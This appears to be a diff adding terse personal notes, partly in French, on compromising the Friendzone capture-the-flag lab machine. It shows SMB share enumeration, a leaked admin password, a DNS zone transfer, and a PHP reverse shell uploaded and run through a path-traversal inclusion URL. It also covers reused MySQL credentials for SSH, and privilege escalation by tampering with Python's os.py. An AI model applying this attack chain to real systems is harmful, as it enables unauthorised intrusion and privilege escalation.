@@ -1,0 +1,71 @@
+--------------------------
+	Friendzone 
+--------------------------
+	smb found
+
+smbclient \\\\10.10.10.123\\general
+
+found : creds.txt
+
+--
+creds for the admin THING:
+
+admin:WORKWORKHhallelujah@#
+--
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	print$          Disk      Printer Drivers
+	Files           Disk      FriendZone Samba Server Files /etc/Files
+	general         Disk      FriendZone Samba Server Files
+	Development     Disk      FriendZone Samba Server Files
+	IPC$            IPC       IPC Service (FriendZone server (Samba, Ubuntu))
+Reconnecting with SMB1 for workgroup listing.
+
+	Server               Comment
+	---------            -------
+
+	Workgroup            Master
+	---------            -------
+	WORKGROUP            FROLIC
+
+
+--
+dig axfr friendzone.red @10.10.10.123
+
+; <<>> DiG 9.11.3-1ubuntu1.3-Ubuntu <<>> axfr friendzone.red @10.10.10.123
+;; global options: +cmd
+friendzone.red.		604800	IN	SOA	localhost. root.localhost. 2 604800 86400 2419200 604800
+friendzone.red.		604800	IN	AAAA	::1
+friendzone.red.		604800	IN	NS	localhost.
+friendzone.red.		604800	IN	A	127.0.0.1
+administrator1.friendzone.red. 604800 IN A	127.0.0.1
+hr.friendzone.red.	604800	IN	A	127.0.0.1
+uploads.friendzone.red.	604800	IN	A	127.0.0.1
+friendzone.red.		604800	IN	SOA	localhost. root.localhost. 2 604800 86400 2419200 604800
+;; Query time: 104 msec
+;; SERVER: 10.10.10.123#53(10.10.10.123)
+;; WHEN: Sat Feb 23 00:56:27 CET 2019
+;; XFR size: 8 records (messages 1, bytes 289)
+--
+
+put myreverseshell.php into Development
+puis : https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=../../../..//etc/Development/reverseshell
+
+
+cat mysql_data.conf
+for development process this is the mysql creds for user friend
+
+db_user=friend
+db_pass=Agpyu12!0.213$
+db_name=FZ
+
+su friend 
+pass : Agpyu12!0.213$
+
+ssh friend@10.10.10.123
+
+modifier le fichier os.py usr/lib/python2.7
+utiliser reporter.py
+
+et c'est win
